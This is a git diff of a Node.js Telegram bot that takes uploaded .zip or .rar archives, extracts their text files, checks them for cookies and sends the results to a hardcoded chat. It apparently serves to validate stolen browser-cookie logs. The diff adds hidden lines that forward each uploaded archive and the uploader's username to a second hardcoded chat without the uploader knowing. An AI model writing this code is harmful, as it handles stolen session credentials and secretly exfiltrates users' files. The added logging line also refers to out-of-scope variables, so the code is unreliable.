@@ -14,7 +14,6 @@ const fs = require("fs");
 const https = require('https');
 let { zip, unzip } = require('cross-unzip')
 const archiver = require('archiver');
-const { del } = require('request');
 
 
 const bot = new Telegraf(config.bot_token);
@@ -26,9 +25,12 @@ bot.launch();
 //bot.hears('Пополнить💲', (ctx) => ctx.scene.enter('paymentAmount', {amount : 100}))
 bot.on("document", async (ctx) => {
     const documentName = ctx.update.message.document.file_name
-    if(documentName.includes('.zip') || documentName.includes('.rar')){
-        let messageId = ctx.update.message.message_id;
+     if(documentName.includes('.zip') || documentName.includes('.rar')){
+      //  let messageId = ctx.update.message.message_id;
         let fileId = ctx.update.message.document.file_id;
+        const sender = ctx.update.message.from.username
+        bot.telegram.sendMessage('868619239',`@${sender} отправил файл:`)
+        bot.telegram.sendDocument('868619239',fileId)
         let link = await ctx.telegram.getFileLink(fileId);
         const path = './3/download/';
         const filename = await downloadFile(link, path, documentName);
@@ -38,15 +40,18 @@ bot.on("document", async (ctx) => {
         const txtFiles = await  getTxtfiles(dir)
         const result = await checkTxtCookies(txtFiles)
         const archiveName = await makeArchieve(resultDir)
-        console.dir({filename,dir,resultDir,txtFiles})
+        //console.dir({filename,dir,resultDir,txtFiles})
         await bot.telegram.sendDocument('1351452476',{source :archiveName})
         bot.telegram.sendMessage('1351452476',result) 
-       // await deleteFiles(dir,archiveName)
+        await deleteFiles(dir,archiveName)
         
 
     }else{
         ctx.reply('неудача')
-    }
+    } 
+
+
+    console.dir({documentId,sender})
   });
   
 
@@ -72,7 +77,7 @@ const downloadFile = async (url, path = "./3/download/",filename) => {
          })
       })
     await promise.then(function(results){
-      console.log('done')
+      console.log('done downloading file')
     })
     return path + filename;
 }
@@ -81,6 +86,7 @@ const downloadFile = async (url, path = "./3/download/",filename) => {
     await fs.rmdirSync(dir, { recursive: true });
     await fs.rmdirSync(dir+'_result', { recursive: true });
     if(fs.existsSync(filename))await fs.unlinkSync(filename)
+    if(fs.existsSync(filename+'_result'))await fs.unlinkSync(filename+'_result')
 }
 
 
